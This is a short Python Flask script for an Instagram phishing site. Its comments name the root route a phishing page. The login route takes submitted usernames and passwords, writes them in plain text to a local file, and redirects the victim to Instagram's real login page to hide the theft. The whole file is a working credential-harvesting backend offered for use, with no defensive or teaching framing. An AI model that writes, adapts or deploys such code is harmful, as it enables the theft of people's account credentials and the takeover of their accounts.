from flask import Flask, request, redirect

app = Flask(__name__)

# Route to handle the form submission
@app.route('/login', methods=['POST'])
def login():
    # Get the username and password from the form
    username = request.form['username']
    password = request.form['password']

    # Log the credentials to a file
    with open('credentials.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")

    # Redirect the user to a legitimate page (e.g., Instagram's official login page)
    return redirect('https://www.instagram.com/accounts/login/')

# Route to serve the phishing page
@app.route('/')
def index():
    return open('index.html').read()

if __name__ == '__main__':
    # Run the server on localhost (127.0.0.1) and port 5000
    app.run(host='0.0.0.0', port=5000)